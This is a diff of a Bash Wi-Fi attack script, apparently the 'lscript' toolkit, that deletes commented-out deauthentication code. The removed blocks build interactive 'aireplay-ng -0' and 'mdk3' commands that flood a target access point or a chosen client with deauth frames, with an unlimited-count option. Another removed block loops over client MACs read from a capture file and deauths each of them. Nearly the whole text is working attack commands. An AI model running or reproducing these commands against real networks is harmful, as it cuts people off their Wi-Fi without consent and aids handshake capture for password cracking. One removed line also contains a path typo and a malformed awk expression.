@@ -20,92 +20,6 @@ k=1
 REDEAUTH="n"
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
-#~ while (( $k != 0 ))
-#~ do
-#~ echo -e "------------------------------"$RS"DEAUTH"$CE"------------------------------"
-#~ if [ "$REDEAUTH" = "y" ]
-#~ then
-	#~ export LASTOPTIONS
-	#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && $LASTOPTIONS && exit; exec bash'
-	#~ #aireplay-ng $LASTOPTIONS
-#~ else
-	#~ echo -e "Do you want to deauth a specific client?"$YNNO": "	
-	#~ read -e OPTION
-	#~ if [ "$OPTION" = "y" ]
-	#~ then
-		#~ echo -e "Enter client's MAC: "
-		#~ read -e TCC
-		#~ echo -e "Type number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
-		#~ read -e DEAUTHS
-		#~ clear
-		#~ if [ -z $DEAUTHS ]
-		#~ then
-			#~ DEAUTHS=0
-		#~ fi
-		#~ LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
-		#~ export DEAUTHS
-		#~ export TARGB
-		#~ export TCC
-		#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
-		#~ #aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
-		#~ #sleep 1h
-	#~ else
-		#~ echo -e "Use mkd3 method?"$YNNO":"
-		#~ read -e MKD3YN
-		#~ if [ "$MKD3YN" = "y" ]
-		#~ then
-			#~ echo "$TARGB" > /root/mdk3bssid.txt
-			#~ LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
-			#~ export DEAUTHS
-			#~ export TARGB
-			#~ xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
-		#~ else
-			#~ echo -e "Type the number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
-			#~ read -e DEAUTHS
-			#~ if [ -z $DEAUTHS ]
-			#~ then
-				#~ DEAUTHS=0
-			#~ fi
-			#~ LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM"
-			#~ export DEAUTHS
-			#~ export TARGB
-			#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
-		#~ fi
-	#~ fi
-#~ fi
-#~ clear
-#~ #----------------------------------------------------------------------------------------------------------------------------------
-#~ echo -e "Re-deauth with the same exact settings?"$YNYES"("$YS"0"$CE"=Exit): "
-#~ read -e REDEAUTH
-#~ if [ "$REDEAUTH" = "n" ]
-#~ then
-	#~ echo -e "Exit completely?"$YNNO": "
-	#~ read -e EXIT
-	#~ if [ "$EXIT" = "y" ]
-	#~ then
-		#~ k=0
-	#~ else
-		#~ clear
-		#~ exec bash "$0"
-	#~ fi
-#~ elif [ "$REDEAUTH" = "0" ]
-#~ then
-	#~ exit
-#~ else
-	#~ clear
-	#~ REDEAUTH="y"
-#~ fi
-#~ done
-#~ echo -e "Sure?"$YNNO": "
-#~ read -e BB
-#~ if [ "$BB" = "y" ]
-#~ then
-	#~ clear
-	#~ exit
-#~ else
-	#~ clear
-	#~ exec bash "$0"
-#~ fi
 ####################################
 printf '\033]2;DEAUTH MENU\a'
 REDEAUTH="n"
@@ -226,36 +140,6 @@ do
 	elif [[ $DT = 4 ]]
 	then
 		LASTOPTIONS=1
-		#~ # MAKE THIS OPTION AVAILABLE ONLY IF A FILE IS CREATED
-		#~ rm -f /root/lscript/deauthtemp.txt
-		#~ while true
-		#~ do
-			#~ dlines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
-			#~ dlines=$((dlines-5))
-			#~ if [ $dlines -gt 0 ]
-			#~ then
-				#~ n=1
-				#~ while [ $n -le $dlines ]
-				#~ do
-					#~ n1=$((5+n))
-					#~ MAC=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
-					#~ if [ -f /root/lscript/deauthtemp.txt ]
-					#~ then
-						#~ CHECKMAC=$(cat /root.lscript/deauthtemp.txt | awk -v n2="$MAC" '{if($0 ~ n2)}print')
-						#~ if [[ $CHECKMAC != "" ]]
-						#~ then
-							#~ continue
-						#~ else
-							#~ echo $MAC >> /root/lscript/deauthtemp.txt
-						#~ fi
-					#~ fi
-					#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MAC $WLANNM && disown; exec bash' 
-					#~ n=$((n+1))
-				#~ done
-			#~ fi
-			#~ sleep 5
-		#~ done
-		#~ ---------------------
 		option4
 	elif [[ $DT = 0 ]]
 	then
